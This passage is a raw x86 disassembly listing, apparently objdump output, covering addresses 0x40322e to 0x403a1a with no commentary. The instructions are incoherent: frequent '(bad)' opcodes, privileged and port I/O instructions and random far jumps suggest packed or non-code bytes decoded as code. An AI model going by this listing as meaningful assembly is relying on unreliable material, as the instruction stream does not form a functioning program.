  40322e:	or     esp,DWORD PTR [ebx-0x7908675a]
  403234:	inc    edx
  403235:	pop    ecx
  403236:	jge    0x4031bd
  403238:	call   0xc6eb:0xa268088b
  40323f:	or     edx,DWORD PTR [ecx+esi*1]
  403242:	dec    edx
  403243:	pop    ds
  403244:	cwde   
  403245:	pop    ss
  403246:	clc    
  403247:	outs   dx,BYTE PTR ds:[esi]
  403248:	mov    esp,0x65f7a8d7
  40324d:	mov    edi,edx
  40324f:	in     eax,dx
  403250:	mov    ah,0xb4
  403252:	ror    DWORD PTR [ecx-0x45],0x61
  403256:	pushw  cs
  403258:	(bad)  
  403259:	inc    ecx
  40325a:	sahf   
  40325b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40325c:	fidiv  DWORD PTR cs:[edx]
  40325f:	test   ebx,esp
  403261:	sti    
  403262:	imul   esi,DWORD PTR [ebx-0x66fce50b],0x6bfc2c24
  40326c:	call   0x3b46:0xa1288854
  403273:	icebp  
  403274:	adc    dl,BYTE PTR [eax-0x69]
  403277:	int3   
  403278:	js     0x403270
  40327a:	cmp    eax,DWORD PTR [edi+0x2b]
  40327d:	mov    dl,0x74
  40327f:	sub    BYTE PTR [ecx-0x3d],ch
  403282:	mov    esi,DWORD PTR [ebx]
  403284:	loop   0x403273
  403286:	push   es
  403287:	addr16 mov dh,al
  40328a:	jo     0x40322f
  40328c:	sub    BYTE PTR [ebx],0xf3
  40328f:	mov    edx,0x55c28183
  403294:	and    eax,0xea06f037
  403299:	adc    al,0xc6
  40329b:	and    esi,DWORD PTR [esp+edi*1+0x60]
  40329f:	rol    DWORD PTR [edi+edi*1],cl
  4032a2:	stos   BYTE PTR es:[edi],al
  4032a3:	ret    0x33d4
  4032a6:	imul   eax,ebx,0xb2b23fea
  4032ac:	fs das 
  4032ae:	mov    ah,0xba
  4032b0:	xor    edx,DWORD PTR [ebx]
  4032b2:	popfw  
  4032b4:	icebp  
  4032b5:	jne    0x40330e
  4032b7:	rcl    BYTE PTR [ebp+ebx*8-0x8],0x5
  4032bc:	xchg   BYTE PTR [ecx+edx*1+0x5f8fbc54],bl
  4032c3:	addr16 loop 0x403334
  4032c6:	mov    cl,0xf3
  4032c8:	xor    BYTE PTR [edx-0x50b9e8da],al
  4032ce:	dec    ebx
  4032cf:	bound  esi,QWORD PTR [edi-0x69bc6098]
  4032d5:	in     al,dx
  4032d6:	inc    ebx
  4032d7:	js     0x40329b
  4032d9:	pop    ecx
  4032da:	(bad)  
  4032db:	repz push ecx
  4032dd:	jg     0x403269
  4032df:	xchg   BYTE PTR ds:0x38891185,bh
  4032e5:	loopne 0x4032a1
  4032e7:	inc    ebx
  4032e8:	(bad)  
  4032e9:	dec    ebp
  4032ea:	lock add eax,0xb936c9d1
  4032f0:	or     eax,0x4f9725ed
  4032f5:	dec    esp
  4032f6:	sbb    BYTE PTR [ebp-0x76be8714],ch
  4032fc:	stc    
  4032fd:	pop    edx
  4032fe:	rcr    edx,0x32
  403301:	mov    esi,0xaf335a39
  403306:	ss or  al,0xd1
  403309:	je     0x40337b
  40330b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40330c:	rol    BYTE PTR [eax],cl
  40330e:	mov    ah,0xbf
  403310:	and    al,0xd3
  403312:	pop    ss
  403313:	pop    edx
  403314:	cmp    esi,DWORD PTR [edx]
  403316:	loope  0x4032c9
  403318:	and    esp,DWORD PTR [esi]
  40331a:	out    0xa7,al
  40331c:	jae    0x403305
  40331e:	stos   BYTE PTR es:[edi],al
  40331f:	cmp    BYTE PTR [esi],ah
  403321:	(bad)  
  403322:	popa   
  403323:	add    ah,BYTE PTR [esi]
  403325:	scas   al,BYTE PTR es:[edi]
  403326:	lahf   
  403327:	in     al,0x69
  403329:	daa    
  40332a:	addr16 mov cl,0xf9
  40332d:	push   ebp
  40332e:	mov    ebp,esi
  403330:	call   0xdcaf:0xd955f18b
  403337:	cli    
  403338:	hlt    
  403339:	loop   0x403333
  40333b:	mov    dl,0x2c
  40333d:	dec    esp
  40333e:	push   ebp
  40333f:	lahf   
  403340:	lahf   
  403341:	fcomi  st,st(0)
  403343:	hlt    
  403344:	out    dx,al
  403345:	add    ebp,DWORD PTR [edx-0x5eeb5d82]
  40334b:	stos   DWORD PTR es:[edi],eax
  40334c:	push   cs
  40334d:	aas    
  40334e:	leave  
  40334f:	inc    eax
  403350:	hlt    
  403351:	jecxz  0x403327
  403353:	repz sbb bh,BYTE PTR [ecx]
  403356:	pop    ecx
  403357:	pop    esp
  403358:	in     eax,0xb6
  40335a:	xor    DWORD PTR [eax+0x3f],0x8
  40335e:	dec    ebx
  40335f:	(bad)  
  403360:	imul   ecx,ebx,0xffffffec
  403363:	rcr    BYTE PTR [ebx-0x410c8461],cl
  403369:	add    DWORD PTR [edx+edx*2+0x52],edx
  40336d:	jmp    0x606b:0x71d274b0
  403374:	jmp    0x40335c
  403376:	lods   al,BYTE PTR ds:[esi]
  403377:	pusha  
  403378:	mov    BYTE PTR [ebp+0x65],ah
  40337b:	leave  
  40337c:	gs sbb al,0x8e
  40337f:	ret    
  403380:	cld    
  403381:	dec    edi
  403382:	and    ah,BYTE PTR [eax-0x7aa1034a]
  403388:	pushf  
  403389:	mov    dh,bl
  40338b:	jbe    0x4033c3
  40338d:	add    DWORD PTR [ebx-0x48],esi
  403390:	out    dx,al
  403391:	ins    BYTE PTR es:[edi],dx
  403392:	cmp    DWORD PTR [ecx+eax*2-0x2dbbc2eb],eax
  403399:	add    ch,ah
  40339b:	stos   BYTE PTR es:[edi],al
  40339c:	mov    al,ds:0xceb0dccc
  4033a1:	cmp    dl,BYTE PTR [eax]
  4033a3:	(bad)  
  4033a4:	ror    BYTE PTR [ecx+edi*2],1
  4033a7:	mov    ds:0x35d4abce,eax
  4033ac:	mov    bl,BYTE PTR ds:0x9a12d4e0
  4033b2:	add    al,0x39
  4033b4:	(bad)  [edx-0x1b1bf32b]
  4033ba:	and    BYTE PTR [edi+0x2b7c7745],al
  4033c0:	nop
  4033c1:	mov    eax,ds:0x1fd37d5
  4033c6:	scas   eax,DWORD PTR es:[edi]
  4033c7:	test   eax,0x91987f2f
  4033cc:	and    ecx,DWORD PTR [ebx+0x62]
  4033cf:	push   es
  4033d0:	mov    ah,0x65
  4033d2:	jbe    0x40340a
  4033d4:	pop    ebp
  4033d5:	and    BYTE PTR [edi+0x49166d69],0x15
  4033dc:	inc    edx
  4033dd:	adc    al,ch
  4033df:	push   ds
  4033e0:	jbe    0x4033e0
  4033e2:	jmp    0x3fd6:0x58b67f7
  4033e9:	inc    esi
  4033ea:	fwait
  4033eb:	sbb    DWORD PTR [edx+0x601cbe6a],esi
  4033f1:	aad    0x5c
  4033f3:	cmp    al,0x6f
  4033f5:	cdq    
  4033f6:	jge    0x4033ba
  4033f8:	arpl   WORD PTR [ecx+0x36],dx
  4033fb:	adc    esi,ecx
  4033fd:	in     al,0xc1
  4033ff:	bound  esp,QWORD PTR [ebx+edx*1+0x2793d604]
  403406:	mov    BYTE PTR [ebx],ah
  403408:	lock enter 0x8660,0xe9
  40340d:	push   edx
  40340e:	adc    DWORD PTR [ecx+0x6412ea29],edi
  403414:	push   edi
  403415:	ror    esi,cl
  403417:	ret    
  403418:	push   ecx
  403419:	pop    edx
  40341a:	cmp    al,0xb4
  40341c:	add    ecx,ebx
  40341e:	into   
  40341f:	sub    eax,DWORD PTR [ecx+0x73b14cbe]
  403425:	and    al,0x80
  403427:	push   edi
  403428:	and    esi,DWORD PTR [ecx]
  40342a:	mov    ebp,0x9db32934
  40342f:	iret   
  403430:	daa    
  403431:	cld    
  403432:	mov    ch,0x6e
  403434:	les    ebp,FWORD PTR [ebx]
  403436:	xchg   edi,eax
  403437:	and    edx,DWORD PTR [ebx+0x7e5f1dfb]
  40343d:	push   ebp
  40343e:	in     eax,dx
  40343f:	shr    BYTE PTR [ecx],0x92
  403442:	ins    DWORD PTR es:[edi],dx
  403443:	test   BYTE PTR [edx-0x54],dl
  403446:	jmp    0xf8c857ca
  40344b:	inc    ecx
  40344c:	sub    DWORD PTR [eax+edi*2-0x2646d6eb],0x33950fa3
  403457:	adc    al,0xa6
  403459:	pop    ecx
  40345a:	mov    ebp,0x91d038f
  40345f:	mov    ch,cl
  403461:	in     eax,dx
  403462:	icebp  
  403463:	sbb    eax,0x4fc74319
  403468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403469:	inc    ecx
  40346a:	jmp    0x908d651b
  40346f:	test   al,0x8
  403471:	sub    al,0x36
  403473:	je     0x403475
  403475:	jge    0x4033f7
  403477:	jnp    0x403481
  403479:	mov    al,ds:0xfb50b03b
  40347e:	mov    edx,0x3556b436
  403483:	sub    eax,0x6493c34b
  403488:	rcl    BYTE PTR [edx],1
  40348a:	cwde   
  40348b:	cli    
  40348c:	push   0xffffffbf
  40348e:	loopne 0x403507
  403490:	pusha  
  403491:	add    edx,DWORD PTR [edx-0x10]
  403494:	dec    ebx
  403495:	dec    edi
  403496:	popf   
  403497:	clc    
  403498:	pushf  
  403499:	adc    eax,0x561400fb
  40349e:	test   BYTE PTR [ecx],dl
  4034a0:	xchg   esi,eax
  4034a1:	sbb    ch,BYTE PTR [eax+0x3282c62c]
  4034a7:	xchg   esp,eax
  4034a8:	dec    sp
  4034aa:	sub    al,0x92
  4034ac:	(bad)  
  4034ad:	outs   dx,DWORD PTR ds:[esi]
  4034ae:	and    BYTE PTR [ebx+edx*8],bh
  4034b1:	sub    cl,BYTE PTR [edi+ebx*8+0x35]
  4034b5:	mov    ?,WORD PTR [ebp-0x21]
  4034b8:	out    0x27,al
  4034ba:	jae    0x403534
  4034bc:	fwait
  4034bd:	and    dl,BYTE PTR [ecx]
  4034bf:	enter  0xdb07,0x48
  4034c3:	cmp    edi,DWORD PTR [ebx]
  4034c5:	lock (bad) 
  4034c7:	mov    ebp,fs
  4034c9:	ret    0xc34d
  4034cc:	add    al,0x33
  4034ce:	test   BYTE PTR [edi+0x416565ab],dl
  4034d4:	mov    eax,ds:0x6f5bf249
  4034d9:	push   eax
  4034da:	xchg   ecx,eax
  4034db:	mov    ?,WORD PTR [ebp+0x5f]
  4034de:	and    eax,0x8fb461f4
  4034e3:	or     DWORD PTR [ebx-0x34],0x71
  4034e7:	js     0x4034af
  4034e9:	pop    ds
  4034ea:	sub    al,BYTE PTR [edx-0x4d208aab]
  4034f0:	mov    eax,DWORD PTR [ebx+0x68b7a1bc]
  4034f6:	mov    al,ds:0x5734b627
  4034fb:	(bad)
  4034ff:	(bad)  
  403500:	cld    
  403501:	(bad)  
  403502:	pop    es
  403503:	push   ebp
  403504:	icebp  
  403505:	push   esp
  403506:	inc    ebx
  403507:	popa   
  403508:	out    0xad,eax
  40350a:	das    
  40350b:	loopne 0x4034b9
  40350d:	sbb    al,0x8a
  40350f:	mov    ah,0xc5
  403511:	retf   
  403512:	fld    TBYTE PTR [ebx+ebp*1+0x51c06f24]
  403519:	xchg   esi,eax
  40351a:	xchg   esi,eax
  40351b:	addr16 jp 0x403559
  40351e:	cmp    cl,BYTE PTR [edi*1+0x6abb9032]
  403525:	mov    esp,0x2a8e8d49
  40352a:	dec    ebx
  40352b:	ja     0x4034f2
  40352d:	dec    ebp
  40352e:	hlt    
  40352f:	xchg   BYTE PTR [edx+0x5c],dh
  403532:	xor    BYTE PTR [edx-0x74b62f36],ah
  403538:	mov    bh,BYTE PTR [esi-0x284c3759]
  40353e:	inc    ebx
  40353f:	in     al,0x7d
  403541:	pop    eax
  403542:	pop    esi
  403543:	jl     0x4034f4
  403545:	ins    DWORD PTR es:[edi],dx
  403546:	(bad)  
  403548:	es mov esi,0x283e4429
  40354e:	addr16 pop ds
  403550:	xchg   ebx,eax
  403551:	(bad)  
  403552:	les    esi,FWORD PTR [ebp+0x1a]
  403555:	push   ecx
  403556:	pop    eax
  403557:	ds adc eax,0xb40f88fd
  40355d:	mov    dh,BYTE PTR [ecx+0x3c]
  403560:	stc    
  403561:	push   0x4c
  403563:	add    al,0xd1
  403565:	mov    eax,0xf3623269
  40356a:	sub    al,0x3b
  40356c:	add    al,al
  40356e:	push   0x87e2b75
  403573:	popf   
  403574:	cmp    DWORD PTR [edx+0xffab7a],ebx
  40357a:	push   ds
  40357b:	add    al,0x72
  40357d:	cmp    bl,BYTE PTR [ebx]
  40357f:	cmp    al,BYTE PTR es:[edx+edi*8+0xc]
  403584:	xchg   ebp,eax
  403585:	jmp    0x2e04:0x66d34ae0
  40358c:	push   eax
  40358d:	jns    0x4035e6
  40358f:	enter  0x68ef,0xb6
  403593:	jp     0x4035f6
  403595:	stc    
  403596:	popa   
  403597:	shl    dl,1
  403599:	mov    al,ds:0xb56a5bcf
  40359e:	mov    esi,0x8d239d97
  4035a3:	fst    QWORD PTR [edi+0x4c871af3]
  4035a9:	test   al,0x7d
  4035ab:	cwde   
  4035ac:	stos   DWORD PTR es:[edi],eax
  4035ad:	mov    dh,0x56
  4035af:	push   esi
  4035b0:	pop    ecx
  4035b1:	inc    ecx
  4035b2:	add    al,0x6c
  4035b4:	xor    al,0xfe
  4035b6:	lahf   
  4035b7:	clc    
  4035b8:	mov    esp,ds
  4035ba:	jo     0x4035d9
  4035bc:	stos   BYTE PTR es:[edi],al
  4035bd:	test   DWORD PTR [eax+0x1320353d],edi
  4035c3:	call   0x744d:0xceffd5eb
  4035ca:	fsubr  st,st(3)
  4035cc:	std    
  4035cd:	stos   BYTE PTR es:[edi],al
  4035ce:	dec    ecx
  4035cf:	jno    0x4035de
  4035d1:	xor    al,0xb2
  4035d3:	pop    es
  4035d4:	lea    esp,[ebp+ebp*1-0x12]
  4035d8:	xchg   DWORD PTR [ebx],esi
  4035da:	inc    edx
  4035db:	mov    al,ds:0xe6ce94e9
  4035e0:	mov    dl,0x13
  4035e2:	mov    ebx,0xec476feb
  4035e7:	mov    al,ds:0x9e8cd99
  4035ec:	loope  0x4035e3
  4035ee:	pop    esp
  4035ef:	or     eax,DWORD PTR [edx]
  4035f1:	push   0x7a38cf95
  4035f6:	sub    al,0x73
  4035f8:	mov    dl,0xec
  4035fa:	or     eax,0xb843b4be
  4035ff:	mov    ds:0x7c950ce2,al
  403604:	xor    al,0x4e
  403606:	sub    al,0x9
  403608:	sub    ch,BYTE PTR [edi]
  40360a:	out    0xdb,eax
  40360c:	test   BYTE PTR [ebp+0xb7683ac],cl
  403612:	mov    ds:0x52ee45f3,al
  403617:	rcr    DWORD PTR [eax],1
  403619:	mov    ds:0x68c8b4b0,eax
  40361e:	mov    ds:0x2df6f110,al
  403623:	jae    0x4035d6
  403625:	mul    BYTE PTR [ecx+0xc8c9b22]
  40362b:	ins    DWORD PTR es:[edi],dx
  40362c:	cs add al,0x3c
  40362f:	das    
  403630:	or     ch,bh
  403632:	xor    ch,0x88
  403635:	fyl2x  
  403637:	bound  ebp,QWORD PTR [ebx+0x42410259]
  40363d:	add    al,BYTE PTR [edi-0x4a]
  403640:	es jae 0x403630
  403643:	push   ecx
  403644:	adc    edx,ebp
  403646:	out    0xc2,eax
  403648:	and    eax,0x8d4fb8e
  40364d:	or     eax,0x39d1543d
  403652:	adc    DWORD PTR [ebp-0x8e9f82b],eax
  403658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403659:	shl    esi,cl
  40365b:	mov    eax,0xa3d5066e
  403660:	cmp    al,0xe1
  403662:	push   ss
  403663:	push   esp
  403664:	clc    
  403665:	xchg   edx,eax
  403666:	cmp    al,0xc6
  403668:	aas    
  403669:	mov    edx,0x92786439
  40366e:	push   esi
  40366f:	das    
  403670:	and    eax,0xfb054f70
  403675:	out    dx,al
  403676:	test   al,0xd0
  403678:	inc    edx
  403679:	mov    al,ds:0x3455e266
  40367e:	dec    edx
  40367f:	sub    BYTE PTR [edx+0x51],al
  403682:	test   DWORD PTR [edi+0x52d1db69],esi
  403688:	adc    DWORD PTR cs:[ecx],ebp
  40368b:	push   esp
  40368c:	xchg   edi,eax
  40368d:	cmp    BYTE PTR [edi],bh
  40368f:	js     0x40368f
  403691:	jmp    0x1c2d7a1d
  403696:	popf   
  403697:	test   DWORD PTR [ebp-0x13],ecx
  40369a:	jmp    0x403628
  40369c:	lock cmp BYTE PTR [edi],dh
  40369f:	ins    BYTE PTR es:[edi],dx
  4036a0:	jp     0x4036b7
  4036a2:	les    ebp,FWORD PTR [esi]
  4036a4:	jbe    0x4036a1
  4036a6:	fsub   DWORD PTR ds:0x92721c0d
  4036ac:	out    0x1c,al
  4036ae:	repz pop esp
  4036b0:	clc    
  4036b1:	and    al,0x45
  4036b4:	pusha  
  4036b5:	xchg   edx,eax
  4036b6:	enter  0x7173,0x16
  4036ba:	(bad)  
  4036bb:	mov    cs,WORD PTR [eax-0x5a]
  4036be:	ja     0x403650
  4036c0:	xchg   DWORD PTR [esi],esp
  4036c2:	add    DWORD PTR [ecx-0x68],edi
  4036c5:	call   0x9fbd:0xc0b72709
  4036cc:	mov    WORD PTR [ebx],ds
  4036ce:	dec    edx
  4036cf:	mov    ebp,DWORD PTR [esi+edi*1]
  4036d2:	jno    0x403736
  4036d4:	je     0x403739
  4036d6:	stc    
  4036d7:	xchg   edx,eax
  4036d8:	shl    DWORD PTR [esi-0x41],1
  4036db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036dc:	jne    0x4036dc
  4036de:	mov    dh,0xa8
  4036e0:	push   0x2812621f
  4036e5:	clc    
  4036e6:	cmp    BYTE PTR [ecx-0x1fea1a18],0x13
  4036ed:	xchg   ebx,eax
  4036ee:	cmp    dl,bl
  4036f0:	inc    edi
  4036f1:	add    ebx,esp
  4036f3:	dec    ecx
  4036f4:	stos   DWORD PTR es:[edi],eax
  4036f5:	sahf   
  4036f6:	aaa    
  4036f7:	pop    edi
  4036f8:	(bad)  
  4036f9:	jo     0x4036d5
  4036fb:	sub    eax,0x8349d64e
  403700:	fs out 0x65,al
  403703:	push   esi
  403704:	aad    0xfc
  403706:	push   edi
  403707:	add    al,0x6c
  403709:	inc    ebp
  40370a:	test   al,0x16
  40370c:	aaa    
  40370d:	xor    bl,BYTE PTR [ecx-0x32]
  403710:	into   
  403711:	mov    edi,DWORD PTR [esp+esi*4]
  403714:	dec    ebp
  403715:	dec    esp
  403716:	sub    esi,esi
  403718:	cmp    BYTE PTR [ecx-0x7b54422f],al
  40371e:	out    0x84,al
  403720:	hlt    
  403721:	iret   
  403722:	ja     0x403784
  403724:	inc    edi
  403725:	sar    DWORD PTR [eax],cl
  403727:	fwait
  403728:	icebp  
  403729:	not    esi
  40372b:	push   0x38c78078
  403730:	push   edi
  403731:	dec    esp
  403732:	mov    esp,0xa373e726
  403737:	cmp    bl,BYTE PTR [ebx+ecx*2-0x69]
  40373b:	sub    esi,esp
  40373d:	mov    esp,0xa0b11baf
  403742:	stos   BYTE PTR es:[edi],al
  403743:	mov    al,0x9
  403745:	sbb    ch,BYTE PTR [edi-0x6cf1e072]
  40374b:	dec    ecx
  40374c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40374d:	popa   
  40374e:	clc    
  40374f:	pushf  
  403750:	pop    ecx
  403751:	std    
  403752:	xchg   edx,eax
  403753:	mov    dh,0x97
  403755:	enter  0xf08d,0x83
  403759:	mov    al,0xe8
  40375b:	add    bl,ah
  40375d:	dec    ecx
  40375e:	dec    ebp
  40375f:	jnp    0x403754
  403761:	out    0xb3,eax
  403763:	cmp    bh,BYTE PTR [eax]
  403765:	(bad)  
  403766:	xchg   ecx,eax
  403767:	lods   al,BYTE PTR ds:[esi]
  403768:	sbb    bh,BYTE PTR [esi+ebx*2-0x39]
  40376c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40376d:	jne    0x40373d
  40376f:	lahf   
  403770:	mov    esi,0xa311ed4d
  403775:	jnp    0x40370c
  403777:	sbb    eax,0xb557a690
  40377c:	add    BYTE PTR [eax],ch
  40377e:	aam    0xd6
  403780:	jnp    0x4037cb
  403782:	mov    al,ds:0x9c342047
  403787:	clc    
  403788:	dec    ecx
  403789:	jae    0x40373e
  40378b:	aam    0xa8
  40378d:	push   eax
  40378e:	push   0x38a68788
  403793:	pop    esp
  403794:	gs cs test al,0xf
  403798:	pop    es
  403799:	mov    WORD PTR [ebx-0x60],es
  40379c:	adc    al,0x68
  40379e:	xchg   DWORD PTR [edx+esi*2+0x4c],esi
  4037a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037a3:	cmp    DWORD PTR [esi-0x28],ebp
  4037a6:	cmp    DWORD PTR [ebp+0x6cf68d72],edx
  4037ac:	cmp    DWORD PTR [ebx-0x14712acf],ebp
  4037b2:	xchg   DWORD PTR [ebx-0x773219b7],ebx
  4037b8:	adc    ah,0xe9
  4037bb:	mov    bl,0x47
  4037bd:	adc    al,BYTE PTR [eax-0x50]
  4037c0:	mov    BYTE PTR [eax-0x77768ab2],al
  4037c6:	ret    0x71f2
  4037c9:	mov    ch,0x3e
  4037cb:	sbb    eax,0xd7ecfbe7
  4037d0:	xchg   edi,eax
  4037d1:	data16 jae 0x403840
  4037d4:	xor    DWORD PTR [edi-0x2e1dbae4],ecx
  4037da:	mov    DWORD PTR [eax-0x56],ebp
  4037dd:	aaa    
  4037de:	sub    al,dl
  4037e0:	dec    eax
  4037e1:	pop    edi
  4037e2:	pop    esi
  4037e3:	add    DWORD PTR [ecx+0x10424f2b],0x6f
  4037ea:	fnstenv [ecx]
  4037ec:	mov    edx,0x8d539f9d
  4037f1:	pop    ecx
  4037f2:	mov    esp,0xca53cdfc
  4037f7:	and    ebx,DWORD PTR [edi]
  4037f9:	push   esp
  4037fa:	fs jmp 0x40383e
  4037fd:	inc    edx
  4037fe:	xchg   ebp,eax
  4037ff:	std    
  403800:	and    esp,DWORD PTR [ebp+0x67a12aa2]
  403806:	rol    DWORD PTR [esi+0x63],1
  403809:	or     ebx,0x50
  40380c:	xchg   edx,eax
  40380d:	dec    esp
  40380e:	add    BYTE PTR [edx+0x3f],bh
  403811:	ds adc eax,0x6fdca039
  403817:	mov    ecx,0x2abe65d1
  40381c:	jp     0x4037c0
  40381e:	push   es
  40381f:	cmp    ebp,DWORD PTR [esi-0x3a6e4800]
  403825:	add    DWORD PTR [edi+0x6f],esp
  403828:	mov    dh,BYTE PTR [esp+esi*2+0x6d9b097f]
  40382f:	mov    ebx,0xcfbd4c36
  403834:	sub    al,0xc
  403836:	lods   al,BYTE PTR ds:[esi]
  403837:	pop    DWORD PTR [esi-0x372f16b1]
  40383d:	frstor [esi-0x49]
  403840:	adc    bl,BYTE PTR [esi]
  403842:	xchg   esp,eax
  403843:	mov    al,0xd7
  403845:	test   dh,dh
  403847:	pop    ds
  403848:	js     0x403846
  40384a:	adc    dl,cl
  40384c:	or     ch,BYTE PTR [eax]
  40384e:	aaa    
  40384f:	mov    ah,0xbc
  403851:	out    dx,al
  403852:	ret    
  403853:	ficom  DWORD PTR [edx]
  403855:	mov    dh,0x36
  403857:	pop    ecx
  403858:	lahf   
  403859:	cdq    
  40385a:	pop    esp
  40385b:	iret   
  40385c:	sub    dh,BYTE PTR [edi+0xd]
  40385f:	mov    ah,ch
  403861:	fstp   QWORD PTR [ecx]
  403863:	mov    BYTE PTR [edi+0x13],0xe
  403867:	push   ecx
  403868:	add    DWORD PTR [esi],ebp
  40386a:	jns    0x40389e
  40386c:	adc    al,0x3a
  40386e:	jnp    0x403826
  403870:	inc    esp
  403871:	jle    0x40388c
  403873:	lahf   
  403874:	sar    BYTE PTR [edx],0x8c
  403877:	mov    ch,0xd2
  403879:	shr    BYTE PTR [ebx+0x6225e71f],0xd9
  403880:	add    DWORD PTR [edi+0x53bfcfa9],0xffffffef
  403887:	mov    cl,0x7d
  403889:	nop
  40388a:	lds    edi,FWORD PTR [edx+ebx*1-0x6cda9496]
  403891:	in     eax,0xb8
  403893:	xor    al,ah
  403895:	scas   al,BYTE PTR es:[edi]
  403896:	xor    esp,DWORD PTR [ebp+0x25]
  403899:	cmp    bl,dl
  40389b:	cmc    
  40389c:	and    BYTE PTR [esi-0x64062f07],ch
  4038a2:	sbb    edi,DWORD PTR [eax-0x40]
  4038a5:	or     esp,DWORD PTR [edx+0xeaa7a1b]
  4038ab:	mov    ebp,edx
  4038ad:	mov    BYTE PTR [ebx+0x35],ah
  4038b0:	out    dx,al
  4038b1:	inc    ebp
  4038b2:	mov    cs,edi
  4038b4:	mov    al,ds:0x9db35a47
  4038b9:	aaa    
  4038ba:	pushf  
  4038bb:	mov    ch,bh
  4038bd:	add    eax,edx
  4038bf:	cs add ah,cl
  4038c2:	aaa    
  4038c3:	cs pop edx
  4038c5:	xor    dl,BYTE PTR [edi-0x3e]
  4038c8:	push   ds
  4038c9:	stc    
  4038ca:	mov    esp,ebx
  4038cc:	cmp    eax,0xfcec9ecd
  4038d1:	push   es
  4038d2:	idiv   DWORD PTR [ecx-0x7]
  4038d5:	dec    esp
  4038d6:	sbb    al,0x23
  4038d8:	(bad)  
  4038da:	clc    
  4038db:	into   
  4038dc:	repnz xchg ecx,eax
  4038de:	push   ecx
  4038df:	jb     0x403943
  4038e1:	fs jae 0x4038e0
  4038e4:	dec    edi
  4038e5:	in     eax,0xa1
  4038e7:	add    eax,0x68cc3ce8
  4038ec:	xchg   edi,eax
  4038ed:	xchg   BYTE PTR [esi+eax*8+0x70b0eaeb],bh
  4038f4:	stc    
  4038f5:	leave  
  4038f6:	jns    0x4038e3
  4038f8:	ja     0x403945
  4038fa:	lahf   
  4038fb:	inc    esp
  4038fc:	test   al,0xa2
  4038fe:	jb     0xc92ffb0
  403904:	arpl   cx,sp
  403906:	adc    eax,DWORD PTR [ecx]
  403908:	jle    0x40390b
  40390a:	adc    BYTE PTR [edi+0x444ad594],ah
  403910:	(bad)  
  403911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403912:	adc    BYTE PTR [edx+0x23e0cef5],bh
  403918:	jge    0x403927
  40391a:	daa    
  40391b:	dec    edx
  40391c:	mov    edx,0xdd87ff68
  403922:	test   al,0x51
  403924:	adc    BYTE PTR [eax-0x2f5a42ed],bl
  40392a:	push   ebp
  40392b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40392c:	(bad)  
  40392d:	bound  ebx,QWORD PTR [ecx]
  40392f:	or     eax,DWORD PTR [edi-0x55e52a1a]
  403935:	pop    ds
  403936:	sbb    DWORD PTR ds:0x6f410fc,0xfffffff1
  40393d:	cmp    esp,DWORD PTR [ebx+0x30]
  403940:	mov    ecx,0x316ad32
  403945:	jnp    0x40392d
  403947:	cmp    DWORD PTR [edx+0x6550096],0xffffffb6
  40394e:	mov    eax,0x44d6519d
  403953:	jp     0x4038fe
  403955:	das    
  403956:	clc    
  403957:	sar    DWORD PTR [ecx+0x62a92b],0x6f
  40395e:	(bad)  
  40395f:	das    
  403960:	scas   al,BYTE PTR es:[edi]
  403961:	repz jle 0x403908
  403964:	adc    BYTE PTR [edx+0x157d8385],bl
  40396a:	test   BYTE PTR [edx-0x1a],ah
  40396d:	adc    DWORD PTR [edx+0x30abb852],ebx
  403973:	cdq    
  403974:	mov    ch,0xfa
  403976:	xchg   ebx,eax
  403977:	jae    0x403941
  403979:	or     ah,BYTE PTR ds:0xcce426a4
  40397f:	call   0xd69da54d
  403984:	mov    ah,0x1d
  403986:	sub    eax,0x99a2ca79
  40398b:	ror    ecx,1
  40398d:	(bad)  
  40398e:	faddp  st(0),st
  403990:	mov    dl,0x2f
  403992:	iret   
  403993:	jb     0x4039ab
  403995:	fdivrp st(3),st
  403997:	outs   dx,DWORD PTR ds:[esi]
  403998:	retf   
  403999:	inc    ecx
  40399a:	pop    esi
  40399b:	adc    BYTE PTR [ebx-0xa52da7e],0x27
  4039a2:	ins    DWORD PTR es:[edi],dx
  4039a3:	icebp  
  4039a4:	add    edx,DWORD PTR [edi+0x27]
  4039a7:	shr    DWORD PTR [edi],0x8c
  4039aa:	mov    ds:0x86b0020e,eax
  4039af:	test   BYTE PTR [edx-0x6e],0x37
  4039b3:	dec    esi
  4039b4:	sbb    eax,0x86fc4791
  4039b9:	jecxz  0x4039d0
  4039bb:	sub    al,0x60
  4039bd:	pop    es
  4039be:	loope  0x403a3c
  4039c0:	loope  0x403a13
  4039c2:	data16 fs in al,dx
  4039c5:	mov    al,ds:0x815003bf
  4039ca:	push   esi
  4039cb:	js     0x4039de
  4039cd:	inc    edx
  4039ce:	push   edx
  4039cf:	push   esi
  4039d0:	lods   al,BYTE PTR ds:[esi]
  4039d1:	jge    0x403a2c
  4039d3:	jns    0x4039b4
  4039d5:	jg     0x403970
  4039d7:	outs   dx,DWORD PTR ds:[esi]
  4039d8:	lds    ecx,FWORD PTR [edx-0x309aae44]
  4039de:	cmp    al,0x93
  4039e0:	add    ebx,DWORD PTR [esi-0x4a]
  4039e3:	pop    esp
  4039e4:	in     al,0xa8
  4039e6:	jnp    0x403a63
  4039e8:	data16 xor BYTE PTR [esi-0x4ffaa37d],bh
  4039ef:	sub    edi,DWORD PTR [ecx-0x44]
  4039f2:	inc    ebp
  4039f3:	and    eax,0xd6b8a989
  4039f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039fa:	ret    
  4039fb:	clc    
  4039fc:	mov    ds:0x12014d2,al
  403a01:	jge    0x403a17
  403a03:	or     esp,DWORD PTR [ebp+ebx*2+0x6a51651f]
  403a0a:	out    0xe0,eax
  403a0c:	mov    ebx,0x876cd1ef
  403a11:	jle    0x403a59
  403a13:	mov    dl,0xc3
  403a15:	rol    ecx,1
  403a17:	xchg   esi,eax
  403a18:	faddp  st(7),st
  403a1a:	sbb    al,0x43
